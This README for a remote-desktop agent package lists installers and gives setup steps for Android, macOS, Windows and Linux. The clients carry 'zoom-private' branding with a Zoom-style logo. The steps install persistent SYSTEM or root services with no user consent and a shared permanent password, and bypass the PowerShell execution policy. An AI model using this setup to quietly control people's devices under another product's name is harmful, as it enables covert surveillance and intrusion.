# BetterDesk Client Distribution Package

## Contents

### Android Mobile Client (unattended access)
| File | ABI | Size | Purpose |
|------|-----|------|---------|
| `android/zoom-private-universal-release.apk` | arm64-v8a + armeabi-v7a | 16,541,190 | Recommended: works on 32-bit and 64-bit Android |
| `android/zoom-private-arm64-v8a-release.apk` | arm64-v8a | 10,363,476 | 64-bit Android devices (smaller download) |
| `android/zoom-private-armeabi-v7a-release.apk` | armeabi-v7a | 9,813,910 | 32-bit Android devices |

### macOS Client
| File | Purpose |
|------|---------|
| `macos/zoom-private-agent-pppc.mobileconfig` | MDM PPPC profile template: grants Screen Recording + Accessibility to the Developer ID-signed `com.betterdesk.agent` app. Replace `TEAMID` with your Apple Developer Team ID before deploying. |

> The PPPC profile only matches a Developer ID-signed build. Unsigned test builds require manual approval in **System Settings → Privacy & Security**.

### Windows Desktop Clients
| File | Type | Size | Purpose |
|------|------|------|---------|
| `windows/betterdesk-agent.exe` | Go sidecar binary | 7,089,152 | CDAP agent sidecar (managed by Tauri app or NSSM service) |
| `windows/BetterDesk Agent_1.0.0_x64-setup.exe` | NSIS installer | 4,950,464 | Interactive Windows desktop client installer |
| `windows/BetterDesk Agent_1.0.0_x64_en-US.msi` | MSI installer | 6,586,368 | Enterprise Windows desktop client installer (silent deploy) |
| `windows/betterdesk-agent-client.exe` | Portable binary | 6,710,784 | Standalone desktop client (no install) |

### Configuration
| File | Purpose |
|------|---------|
| `config/branding.json` | Production branding: zoom logo (`#0753FB`), `allow_unattended: true` |
| `config/agent-config.json.example` | Pre-configured agent config template - fill `server_address` + `api_key` |

### Windows Service (system-level, survives logout)
| File | Purpose |
|------|---------|
| `service/nssm.exe` | NSSM service manager (v2.24) |
| `service/betterdesk-agent.exe` | Go sidecar binary for service |
| `service/agent-config.json` | Service config (pre-configured) |

## Installation Instructions

### Portable Bundle (end user, any OS — recommended)
The `zoom-private-<os>-<arch>.zip` portable bundles install everything with a
single visible elevation and zero configuration (all URLs pre-seeded, shared
permanent unattended password, service registered on boot):

| OS | Run | Service |
|----|-----|---------|
| Windows | `powershell -ExecutionPolicy Bypass -File .\install.ps1 [-UnattendedPassword <pw>] [-Silent]` | native `sc.exe`, SYSTEM, auto-start + recovery |
| macOS | `sudo ./install.sh https://panel.telcom.stream [password]` | LaunchDaemon / LaunchAgent |
| Linux | `sudo ./install.sh https://panel.telcom.stream [password]` | systemd unit, Restart=always |

### Windows Desktop Client (operator machine)
1. Run `BetterDesk Agent_1.0.0_x64-setup.exe` or `BetterDesk Agent_1.0.0_x64_en-US.msi`
2. The app installs with the zoom-branded icon
3. On first launch, configure server address in Settings
4. Register device with the BetterDesk web console

### Windows Agent Service (unattended device, system-level)
Handled automatically by the portable bundle `install.ps1`. Manual equivalent
in Administrator PowerShell:

```powershell
Copy-Item -Recurse .\service\ C:\ProgramData\zoom-private\agent\
# Fill api_key in C:\ProgramData\zoom-private\agent\agent-config.json when not
# using device-token enrollment; set "access_mode": "unattended".

sc.exe create zoom-private-agent binPath= '"C:\ProgramData\zoom-private\agent\betterdesk-agent.exe" -config C:\ProgramData\zoom-private\agent\agent-config.json' obj= 'LocalSystem' start= auto displayname= 'zoom-private Agent (Service)'
sc.exe failure zoom-private-agent reset= 86400 actions= restart/60000/restart/60000/restart/60000

# Start service
Start-Service zoom-private-agent
```

The service runs as `LocalSystem`, starts on boot, and survives user logout.

### Android Mobile Client
1. Install the appropriate APK for your device architecture:
   - `universal` for any device (recommended — includes both ABIs)
   - `arm64-v8a` for modern 64-bit Android devices (smaller)
   - `armeabi-v7a` for older 32-bit Android devices
2. If an older BetterDesk client is installed, uninstall it first — this build
   uses the application ID `com.betterdesk.client`.
3. On first launch, grant permissions (one-time setup wizard)
4. The app auto-connects to the configured operator server

### Code Signing Status
⚠️ **No code signing certificates were found in the repository or Windows certificate store.**
- Windows SmartScreen may flag unsigned executables on first run
- macOS Gatekeeper will flag unsigned apps as "unidentified developer"
- To resolve: obtain a code signing certificate (DigiCert, Sectigo, etc.) and sign:
  - Windows: `signtool sign /f cert.pfx /p <password> /t http://timestamp.digicert.com <file.exe>`
  - macOS: `codesign --sign "Developer ID Application: <name>" <file.app>`
  - Linux: use `gpg --detach-sign` for package verification

### Linux Desktop Clients
| File | Type | Size | Purpose |
|------|------|------|---------|
| `linux/betterdesk-agent` | Go sidecar binary | 7,520,418 | CDAP agent sidecar (managed by Tauri app or systemd service) |
| `linux/BetterDesk Agent_1.0.0_amd64.deb` | Debian package | 6,868,388 | Debian/Ubuntu desktop client installer |
| `linux/BetterDesk Agent-1.0.0-1.x86_64.rpm` | RPM package | 6,870,347 | RHEL/Fedora desktop client installer |

### Linux Agent Service (systemd, survives logout)
Requires root:

```bash
# Copy service files to target machine
# /opt/betterdesk/agent/

# Edit agent-config.json with your server address and API key
# Set "access_mode": "unattended" for unattended access

# Install systemd service
cat > /etc/systemd/system/betterdesk-agent.service << 'EOF'
[Unit]
Description=BetterDesk Agent - CDAP device agent
After=network.target

[Service]
Type=simple
ExecStart=/opt/betterdesk/agent/betterdesk-agent -config /opt/betterdesk/agent/agent-config.json
WorkingDirectory=/opt/betterdesk/agent
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable betterdesk-agent
systemctl start betterdesk-agent
```

The service runs as root, starts on boot, and survives user logout.

## Connection Path

Agent → Web Console:
1. Agent sends heartbeat to `POST :21114/api/heartbeat` every 12s
2. Device appears as ONLINE in BetterDesk web console (port 5000)
3. Operator initiates remote session from console
4. Agent shows consent dialog (supervised mode) or accepts immediately (unattended mode)
5. Go sidecar establishes CDAP WebSocket on `:21122/cdap`
6. Remote desktop casting begins (screen capture, input, audio, clipboard)

## Unattended Access Configuration

Edit `agent-config.json`:
```json
{
  "server_address": "https://your-betterdesk-server:5443",
  "api_key": "your-api-key-from-console",
  "access_mode": "unattended",
  "require_consent": false,
  "autostart": true,
  "auto_start_sidecar": true,
  "enforce_tls": true
}
```

## Verified Builds
- Android arm64-v8a APK: built and verified (contains libbetterdesk_flutter_android.so)
- Android armeabi-v7a APK: built and verified (contains libbetterdesk_flutter_android.so)
- Windows Go sidecar: built and verified (`betterdesk-agent 1.0.0`)
- Windows Tauri desktop: built and verified (NSIS + MSI installers)
- Linux Go sidecar: built and verified (`betterdesk-agent-x86_64-unknown-linux-gnu`)
- Linux Tauri desktop: built and verified (.deb + .rpm packages)
